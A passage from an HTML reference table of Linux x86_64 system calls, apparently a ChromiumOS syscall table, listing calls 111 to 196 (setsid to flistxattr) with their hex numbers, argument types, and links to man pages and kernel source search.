align="center">0x6f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">112</td><td>setsid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setsid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setsid">cs/</a></td><td align="center">0x70</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">113</td><td>setreuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setreuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setreuid">cs/</a></td><td align="center">0x71</td><td>uid_t ruid</td><td>uid_t euid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">114</td><td>setregid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setregid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setregid">cs/</a></td><td align="center">0x72</td><td>gid_t rgid</td><td>gid_t egid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">115</td><td>getgroups</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getgroups.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgroups">cs/</a></td><td align="center">0x73</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">116</td><td>setgroups</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setgroups.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgroups">cs/</a></td><td align="center">0x74</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">117</td><td>setresuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setresuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresuid">cs/</a></td><td align="center">0x75</td><td>uid_t ruid</td><td>uid_t euid</td><td>uid_t suid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">118</td><td>getresuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getresuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresuid">cs/</a></td><td align="center">0x76</td><td>uid_t *ruid</td><td>uid_t *euid</td><td>uid_t *suid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">119</td><td>setresgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setresgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresgid">cs/</a></td><td align="center">0x77</td><td>gid_t rgid</td><td>gid_t egid</td><td>gid_t sgid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">120</td><td>getresgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getresgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresgid">cs/</a></td><td align="center">0x78</td><td>gid_t *rgid</td><td>gid_t *egid</td><td>gid_t *sgid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">121</td><td>getpgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpgid">cs/</a></td><td align="center">0x79</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">122</td><td>setfsuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsuid">cs/</a></td><td align="center">0x7a</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">123</td><td>setfsgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsgid">cs/</a></td><td align="center">0x7b</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">124</td><td>getsid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getsid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsid">cs/</a></td><td align="center">0x7c</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">125</td><td>capget</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/capget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*capget">cs/</a></td><td align="center">0x7d</td><td>cap_user_header_t header</td><td>cap_user_data_t dataptr</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">126</td><td>capset</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/capset.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*capset">cs/</a></td><td align="center">0x7e</td><td>cap_user_header_t header</td><td>const cap_user_data_t data</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">127</td><td>rt_sigpending</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigpending.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigpending">cs/</a></td><td align="center">0x7f</td><td>sigset_t *set</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">128</td><td>rt_sigtimedwait</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigtimedwait.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigtimedwait">cs/</a></td><td align="center">0x80</td><td>const sigset_t *uthese</td><td>siginfo_t *uinfo</td><td>const struct __kernel_timespec *uts</td><td>size_t sigsetsize</td><td>-</td><td>-</td></tr><tr><td align="center">129</td><td>rt_sigqueueinfo</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigqueueinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigqueueinfo">cs/</a></td><td align="center">0x81</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">130</td><td>rt_sigsuspend</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigsuspend.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigsuspend">cs/</a></td><td align="center">0x82</td><td>sigset_t *unewset</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">131</td><td>sigaltstack</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigaltstack.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigaltstack">cs/</a></td><td align="center">0x83</td><td>const struct sigaltstack *uss</td><td>struct sigaltstack *uoss</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">132</td><td>utime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/utime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*utime">cs/</a></td><td align="center">0x84</td><td>char *filename</td><td>struct utimbuf *times</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">133</td><td>mknod</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mknod.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mknod">cs/</a></td><td align="center">0x85</td><td>const char *filename</td><td>umode_t mode</td><td>unsigned dev</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">134</td><td>uselib</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/uselib.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*uselib">cs/</a></td><td align="center">0x86</td><td>const char *library</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">135</td><td>personality</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/personality.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*personality">cs/</a></td><td align="center">0x87</td><td>unsigned int personality</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">136</td><td>ustat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ustat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ustat">cs/</a></td><td align="center">0x88</td><td>unsigned dev</td><td>struct ustat *ubuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">137</td><td>statfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/statfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*statfs">cs/</a></td><td align="center">0x89</td><td>const char * path</td><td>struct statfs *buf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">138</td><td>fstatfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstatfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstatfs">cs/</a></td><td align="center">0x8a</td><td>unsigned int fd</td><td>struct statfs *buf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">139</td><td>sysfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sysfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sysfs">cs/</a></td><td align="center">0x8b</td><td>int option</td><td>unsigned long arg1</td><td>unsigned long arg2</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">140</td><td>getpriority</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpriority.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpriority">cs/</a></td><td align="center">0x8c</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">141</td><td>setpriority</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setpriority.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setpriority">cs/</a></td><td align="center">0x8d</td><td>int which</td><td>int who</td><td>int niceval</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">142</td><td>sched_setparam</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setparam.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setparam">cs/</a></td><td align="center">0x8e</td><td>pid_t pid</td><td>struct sched_param *param</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">143</td><td>sched_getparam</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getparam.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getparam">cs/</a></td><td align="center">0x8f</td><td>pid_t pid</td><td>struct sched_param *param</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">144</td><td>sched_setscheduler</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setscheduler.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setscheduler">cs/</a></td><td align="center">0x90</td><td>pid_t pid</td><td>int policy</td><td>struct sched_param *param</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">145</td><td>sched_getscheduler</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getscheduler.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getscheduler">cs/</a></td><td align="center">0x91</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">146</td><td>sched_get_priority_max</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_get_priority_max.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_get_priority_max">cs/</a></td><td align="center">0x92</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">147</td><td>sched_get_priority_min</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_get_priority_min.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_get_priority_min">cs/</a></td><td align="center">0x93</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">148</td><td>sched_rr_get_interval</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_rr_get_interval.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_rr_get_interval">cs/</a></td><td align="center">0x94</td><td>pid_t pid</td><td>struct __kernel_timespec *interval</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">149</td><td>mlock</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mlock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlock">cs/</a></td><td align="center">0x95</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">150</td><td>munlock</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/munlock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munlock">cs/</a></td><td align="center">0x96</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">151</td><td>mlockall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mlockall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlockall">cs/</a></td><td align="center">0x97</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">152</td><td>munlockall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/munlockall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munlockall">cs/</a></td><td align="center">0x98</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">153</td><td>vhangup</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vhangup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vhangup">cs/</a></td><td align="center">0x99</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">154</td><td>modify_ldt</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/modify_ldt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*modify_ldt">cs/</a></td><td align="center">0x9a</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">155</td><td>pivot_root</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pivot_root.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pivot_root">cs/</a></td><td align="center">0x9b</td><td>const char *new_root</td><td>const char *put_old</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">156</td><td>_sysctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/_sysctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*_sysctl">cs/</a></td><td align="center">0x9c</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">157</td><td>prctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/prctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*prctl">cs/</a></td><td align="center">0x9d</td><td>int option</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td>-</td></tr><tr><td align="center">158</td><td>arch_prctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/arch_prctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*arch_prctl">cs/</a></td><td align="center">0x9e</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">159</td><td>adjtimex</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/adjtimex.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*adjtimex">cs/</a></td><td align="center">0x9f</td><td>struct __kernel_timex *txc_p</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">160</td><td>setrlimit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setrlimit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setrlimit">cs/</a></td><td align="center">0xa0</td><td>unsigned int resource</td><td>struct rlimit *rlim</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">161</td><td>chroot</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chroot.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chroot">cs/</a></td><td align="center">0xa1</td><td>const char *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">162</td><td>sync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sync">cs/</a></td><td align="center">0xa2</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">163</td><td>acct</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/acct.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*acct">cs/</a></td><td align="center">0xa3</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">164</td><td>settimeofday</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/settimeofday.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*settimeofday">cs/</a></td><td align="center">0xa4</td><td>struct timeval *tv</td><td>struct timezone *tz</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">165</td><td>mount</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mount.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mount">cs/</a></td><td align="center">0xa5</td><td>char *dev_name</td><td>char *dir_name</td><td>char *type</td><td>unsigned long flags</td><td>void *data</td><td>-</td></tr><tr><td align="center">166</td><td>umount2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/umount2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*umount2">cs/</a></td><td align="center">0xa6</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">167</td><td>swapon</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/swapon.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*swapon">cs/</a></td><td align="center">0xa7</td><td>const char *specialfile</td><td>int swap_flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">168</td><td>swapoff</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/swapoff.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*swapoff">cs/</a></td><td align="center">0xa8</td><td>const char *specialfile</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">169</td><td>reboot</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/reboot.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*reboot">cs/</a></td><td align="center">0xa9</td><td>int magic1</td><td>int magic2</td><td>unsigned int cmd</td><td>void *arg</td><td>-</td><td>-</td></tr><tr><td align="center">170</td><td>sethostname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sethostname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sethostname">cs/</a></td><td align="center">0xaa</td><td>char *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">171</td><td>setdomainname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setdomainname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setdomainname">cs/</a></td><td align="center">0xab</td><td>char *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">172</td><td>iopl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/iopl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*iopl">cs/</a></td><td align="center">0xac</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">173</td><td>ioperm</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioperm.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioperm">cs/</a></td><td align="center">0xad</td><td>unsigned long from</td><td>unsigned long num</td><td>int on</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">174</td><td>create_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/create_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*create_module">cs/</a></td><td align="center">0xae</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">175</td><td>init_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/init_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*init_module">cs/</a></td><td align="center">0xaf</td><td>void *umod</td><td>unsigned long len</td><td>const char *uargs</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">176</td><td>delete_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/delete_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*delete_module">cs/</a></td><td align="center">0xb0</td><td>const char *name_user</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">177</td><td>get_kernel_syms</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/get_kernel_syms.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_kernel_syms">cs/</a></td><td align="center">0xb1</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">178</td><td>query_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/query_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*query_module">cs/</a></td><td align="center">0xb2</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">179</td><td>quotactl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/quotactl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*quotactl">cs/</a></td><td align="center">0xb3</td><td>unsigned int cmd</td><td>const char *special</td><td>qid_t id</td><td>void *addr</td><td>-</td><td>-</td></tr><tr><td align="center">180</td><td>nfsservctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/nfsservctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*nfsservctl">cs/</a></td><td align="center">0xb4</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">181</td><td>getpmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpmsg">cs/</a></td><td align="center">0xb5</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">182</td><td>putpmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/putpmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*putpmsg">cs/</a></td><td align="center">0xb6</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">183</td><td>afs_syscall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/afs_syscall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*afs_syscall">cs/</a></td><td align="center">0xb7</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">184</td><td>tuxcall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/tuxcall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tuxcall">cs/</a></td><td align="center">0xb8</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">185</td><td>security</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/security.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*security">cs/</a></td><td align="center">0xb9</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">186</td><td>gettid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/gettid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*gettid">cs/</a></td><td align="center">0xba</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">187</td><td>readahead</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readahead.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readahead">cs/</a></td><td align="center">0xbb</td><td>int fd</td><td>loff_t offset</td><td>size_t count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">188</td><td>setxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setxattr">cs/</a></td><td align="center">0xbc</td><td>const char *path</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td>-</td></tr><tr><td align="center">189</td><td>lsetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lsetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lsetxattr">cs/</a></td><td align="center">0xbd</td><td>const char *path</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td>-</td></tr><tr><td align="center">190</td><td>fsetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fsetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fsetxattr">cs/</a></td><td align="center">0xbe</td><td>int fd</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td>-</td></tr><tr><td align="center">191</td><td>getxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getxattr">cs/</a></td><td align="center">0xbf</td><td>const char *path</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td>-</td><td>-</td></tr><tr><td align="center">192</td><td>lgetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lgetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lgetxattr">cs/</a></td><td align="center">0xc0</td><td>const char *path</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td>-</td><td>-</td></tr><tr><td align="center">193</td><td>fgetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fgetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fgetxattr">cs/</a></td><td align="center">0xc1</td><td>int fd</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td>-</td><td>-</td></tr><tr><td align="center">194</td><td>listxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/listxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*listxattr">cs/</a></td><td align="center">0xc2</td><td>const char *path</td><td>char *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">195</td><td>llistxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/llistxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*llistxattr">cs/</a></td><td align="center">0xc3</td><td>const char *path</td><td>char *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">196</td><td>flistxattr</td><td align="center"><a 